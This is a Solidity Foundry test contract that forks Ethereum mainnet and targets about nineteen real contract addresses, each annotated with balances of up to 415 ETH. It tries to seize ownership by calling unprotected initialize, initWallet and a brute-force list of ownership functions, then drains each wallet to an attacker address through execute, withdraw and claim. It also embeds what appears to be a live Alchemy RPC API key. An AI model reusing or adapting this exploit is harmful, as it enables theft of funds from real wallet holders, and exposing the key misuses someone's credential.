// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract InitializeExploit is Test {
    address attacker;

    // High-value targets with callable initialize()
    address constant T1 = 0x2CcfA2AcF6FF744575cCf306B44A59B11C32e44B; // 415 ETH
    address constant T2 = 0xbd6eD4969D9e52032eE3573e643f6a1bdC0a7E1E; // 301 ETH
    address constant T3 = 0x3885b0c18E3C4aB0CA2B8DC99771944404687628; // 250 ETH

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_analyze415ETH() public {
        console.log("=== ANALYZING 415 ETH CONTRACT ===");
        console.log("Target:", T1);
        console.log("Balance:", T1.balance / 1e18, "ETH");
        console.log("Code size:", T1.code.length);

        // Check storage slots for patterns
        console.log("\n=== STORAGE ANALYSIS ===");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(T1, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Check if it's a proxy - look for implementation slot
        bytes32 implSlot = vm.load(T1, bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        console.log("\nEIP1967 impl slot:");
        console.logBytes32(implSlot);

        // Try to get owner
        (bool s, bytes memory d) = T1.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            console.log("Owner:", owner);
        }

        // Try common multisig patterns
        (s, d) = T1.staticcall(abi.encodeWithSignature("m_required()"));
        if (s && d.length >= 32) {
            console.log("m_required:", abi.decode(d, (uint256)));
        }

        (s, d) = T1.staticcall(abi.encodeWithSignature("m_numOwners()"));
        if (s && d.length >= 32) {
            console.log("m_numOwners:", abi.decode(d, (uint256)));
        }

        // Check isOwner for attacker
        (s, d) = T1.staticcall(abi.encodeWithSignature("isOwner(address)", attacker));
        if (s && d.length >= 32) {
            console.log("Attacker isOwner:", abi.decode(d, (bool)));
        }

        // Try initialize with attacker as owner
        console.log("\n=== ATTEMPTING INITIALIZE ===");
        uint256 balBefore = attacker.balance;

        vm.prank(attacker);
        (s,) = T1.call(abi.encodeWithSignature("initialize(address)", attacker));
        console.log("initialize(attacker) success:", s);

        vm.prank(attacker);
        (s,) = T1.call(abi.encodeWithSignature("initWallet(address[],uint256,uint256)", _makeOwners(attacker), 1, T1.balance));
        console.log("initWallet success:", s);

        // Check if attacker is now owner
        (s, d) = T1.staticcall(abi.encodeWithSignature("isOwner(address)", attacker));
        if (s && d.length >= 32) {
            bool isOwner = abi.decode(d, (bool));
            console.log("Attacker isOwner after init:", isOwner);

            if (isOwner) {
                console.log("\n!!! ATTACKER IS NOW OWNER - ATTEMPTING DRAIN !!!");
                vm.prank(attacker);
                (s,) = T1.call(abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, T1.balance, ""));
                console.log("Execute success:", s);
                console.log("Attacker balance after:", attacker.balance / 1e18, "ETH");
            }
        }

        if (attacker.balance > balBefore + 1 ether) {
            console.log("\n!!! EXPLOIT SUCCESSFUL !!!");
            console.log("Gained:", (attacker.balance - balBefore) / 1e18, "ETH");
        }
    }

    function test_deepStorageAnalysis() public view {
        console.log("=== DEEP STORAGE SCAN ===");

        address[3] memory targets = [T1, T2, T3];

        for (uint t = 0; t < 3; t++) {
            address target = targets[t];
            console.log("\nTarget:", target);
            console.log("Balance:", target.balance / 1e18, "ETH");

            // Check for library address in storage (Parity pattern)
            bytes32 slot0 = vm.load(target, bytes32(0));
            bytes32 slot1 = vm.load(target, bytes32(uint256(1)));

            // Extract potential library address from slot 0
            address potentialLib = address(uint160(uint256(slot0)));
            console.log("Potential lib (slot0):", potentialLib);
            console.log("Lib code size:", potentialLib.code.length);

            if (potentialLib.code.length == 0 && potentialLib != address(0)) {
                console.log("!!! DESTROYED LIBRARY - FROZEN FUNDS !!!");
            }
        }
    }

    function test_bruteForceOwnership() public {
        console.log("=== BRUTE FORCE OWNERSHIP ===");

        address target = T1;
        console.log("Target:", target);
        console.log("Balance:", target.balance / 1e18, "ETH");

        // Try various initialization functions
        bytes4[15] memory initFuncs = [
            bytes4(keccak256("initialize()")),
            bytes4(keccak256("initialize(address)")),
            bytes4(keccak256("initialize(address,uint256)")),
            bytes4(keccak256("init()")),
            bytes4(keccak256("init(address)")),
            bytes4(keccak256("__init__()")),
            bytes4(keccak256("setup(address)")),
            bytes4(keccak256("initWallet(address[],uint256,uint256)")),
            bytes4(keccak256("changeOwner(address,address)")),
            bytes4(keccak256("addOwner(address)")),
            bytes4(keccak256("setOwner(address)")),
            bytes4(keccak256("transferOwnership(address)")),
            bytes4(keccak256("acceptOwnership()")),
            bytes4(keccak256("claimOwnership()")),
            bytes4(keccak256("renounceOwnership()"))
        ];

        for (uint i = 0; i < initFuncs.length; i++) {
            // Try with no args
            vm.prank(attacker);
            target.call(abi.encodeWithSelector(initFuncs[i]));

            // Try with attacker address
            vm.prank(attacker);
            target.call(abi.encodeWithSelector(initFuncs[i], attacker));

            // Check if attacker is now owner
            (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("isOwner(address)", attacker));
            if (s && d.length >= 32 && abi.decode(d, (bool))) {
                console.log("!!! OWNERSHIP GAINED via func index:", i);
                _attemptDrain(target);
                return;
            }

            (s, d) = target.staticcall(abi.encodeWithSignature("owner()"));
            if (s && d.length >= 32 && abi.decode(d, (address)) == attacker) {
                console.log("!!! OWNER SET via func index:", i);
                _attemptDrain(target);
                return;
            }
        }

        console.log("No ownership gained");
    }

    function test_checkAllHighValue() public {
        console.log("=== CHECKING ALL HIGH VALUE TARGETS ===");

        // All contracts with 100+ ETH that had callable initialize
        address[20] memory targets = [
            0x2CcfA2AcF6FF744575cCf306B44A59B11C32e44B, // 415 ETH
            0xbd6eD4969D9e52032eE3573e643f6a1bdC0a7E1E, // 301 ETH
            0x3885b0c18E3C4aB0CA2B8DC99771944404687628, // 250 ETH
            0x4615cC10092b514258577dAfcA98C142577f1578, // 232 ETH
            0xc32050abAc7DbFef4FC8DC7b96D9617394cB4E1b, // 340 ETH
            0x7100c7cE94607EF68983F133cfD59Cc1833a115d, // 327 ETH
            0xa08C1134cDD73aD41889F7f914eCC4D3b30C1333, // 325 ETH
            0x2F9f02F2ba99FF5c750f95Cf27D25352f71cd6A9, // 320 ETH
            0x575cb87ab3C2329A0248C7d70e0ead8E57f3e3F7, // 191 ETH
            0x8A909ADc6c299cC4a206e730B15d2b97b0Fbf0BD, // 164 ETH
            0xD64B1BF6fCAb5ADD75041C89F61816c2B3d5E711, // 144 ETH
            0x00000000a8F806c754549943B6550A2594c9a126, // 138 ETH
            0x1F557eEbbf082E73acca1367608A1C50990C15db, // 135 ETH
            0x6E5e0Ef477Db8e26cD64F87522a1997F6ddA64fb, // 132 ETH
            0xA327075af2a223A1C83a36aDa1126afE7430f955, // 130 ETH
            0x766040000d000d735f67A8bfC7C84e9C24b1943b, // 111 ETH
            0xA0589B980cb3c2e153b7ac7dC7c01C2223D7c5d7, // 100 ETH
            0xa6450BCB9f58854f3Fd5A997f5D93DB40f3FA4E3, // 100 ETH (selfdestructed)
            0xc83355eF25A104938275B46cffD94bF9917D0691, // 85 ETH
            address(0) // placeholder
        ];

        for (uint t = 0; t < 19; t++) {
            address target = targets[t];
            if (target == address(0) || target.code.length == 0) continue;

            uint256 bal = target.balance;
            if (bal < 50 ether) continue;

            // Check for destroyed library pattern
            bytes32 slot0 = vm.load(target, bytes32(0));
            address potentialLib = address(uint160(uint256(slot0)));

            if (potentialLib != address(0) && potentialLib.code.length == 0) {
                // Frozen wallet - skip
                continue;
            }

            // Try to claim ownership
            uint256 attackerBefore = attacker.balance;

            vm.prank(attacker);
            target.call(abi.encodeWithSignature("initialize(address)", attacker));

            vm.prank(attacker);
            target.call(abi.encodeWithSignature("initWallet(address[],uint256,uint256)", _makeOwners(attacker), 1, bal));

            // Try execute
            vm.prank(attacker);
            target.call(abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, bal, ""));

            vm.prank(attacker);
            target.call(abi.encodeWithSignature("withdraw()"));

            vm.prank(attacker);
            target.call(abi.encodeWithSignature("claim()"));

            if (attacker.balance > attackerBefore) {
                console.log("!!! EXPLOIT FOUND !!!");
                console.log("Target:", target);
                console.log("Gained:", (attacker.balance - attackerBefore) / 1e18, "ETH");
                return;
            }
        }

        console.log("No exploits found in high-value targets");
    }

    function _makeOwners(address owner) internal pure returns (address[] memory) {
        address[] memory owners = new address[](1);
        owners[0] = owner;
        return owners;
    }

    function _attemptDrain(address target) internal {
        uint256 bal = target.balance;
        uint256 before = attacker.balance;

        vm.prank(attacker);
        (bool s,) = target.call(abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, bal, ""));
        console.log("Execute success:", s);

        vm.prank(attacker);
        target.call(abi.encodeWithSignature("withdraw()"));

        vm.prank(attacker);
        target.call(abi.encodeWithSignature("withdrawAll()"));

        if (attacker.balance > before) {
            console.log("!!! DRAINED:", (attacker.balance - before) / 1e18, "ETH !!!");
        } else {
            console.log("No ETH drained despite ownership");
        }
    }
}
